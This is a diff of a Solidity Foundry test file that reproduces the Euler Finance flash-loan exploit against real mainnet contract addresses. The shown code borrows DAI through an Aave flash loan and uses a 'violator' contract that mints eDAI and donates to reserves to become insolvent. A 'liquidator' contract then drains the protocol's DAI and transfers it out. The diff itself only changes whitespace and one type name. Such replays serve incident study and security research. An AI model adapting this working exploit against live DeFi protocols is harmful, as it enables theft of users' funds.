@@ -25,17 +25,22 @@ import "./../interface.sol";
 // 10) Repay flash loans
 
 interface EToken {
+
     function deposit(uint256 subAccountId, uint256 amount) external;
     function mint(uint256 subAccountId, uint256 amount) external;
     function donateToReserves(uint256 subAccountId, uint256 amount) external;
     function withdraw(uint256 subAccountId, uint256 amount) external;
+
 }
 
 interface DToken {
+
     function repay(uint256 subAccountId, uint256 amount) external;
+
 }
 
 interface IEuler {
+
     struct LiquidationOpportunity {
         uint256 repay;
         uint256 yield;
@@ -58,9 +63,11 @@ interface IEuler {
         address underlying,
         address collateral
     ) external returns (LiquidationOpportunity memory liqOpp);
+
 }
 
 contract ContractTest is Test {
+
     IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
     EToken eDAI = EToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);
     DToken dDAI = DToken(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);
@@ -87,7 +94,7 @@ contract ContractTest is Test {
         assets[0] = address(DAI);
         uint256[] memory amounts = new uint256[](1);
         amounts[0] = aaveFlashLoanAmount;
-        uint256[] memory modes = new uint[](1);
+        uint256[] memory modes = new uint256[](1);
         modes[0] = 0;
         bytes memory params =
             abi.encode(30_000_000, 200_000_000, 100_000_000, 44_000_000, address(DAI), address(eDAI), address(dDAI));
@@ -111,9 +118,11 @@ contract ContractTest is Test {
         liquidator.liquidate(address(liquidator), address(violator));
         return true;
     }
+
 }
 
 contract Iviolator {
+
     IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
     EToken eDAI = EToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);
     DToken dDAI = DToken(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);
@@ -128,9 +137,11 @@ contract Iviolator {
         eDAI.mint(0, 200_000_000 * 1e18);
         eDAI.donateToReserves(0, 100_000_000 * 1e18);
     }
+
 }
 
 contract Iliquidator {
+
     IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
     EToken eDAI = EToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);
     DToken dDAI = DToken(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);
@@ -144,4 +155,5 @@ contract Iliquidator {
         eDAI.withdraw(0, DAI.balanceOf(Euler_Protocol));
         DAI.transfer(msg.sender, DAI.balanceOf(address(this)));
     }
+
 }
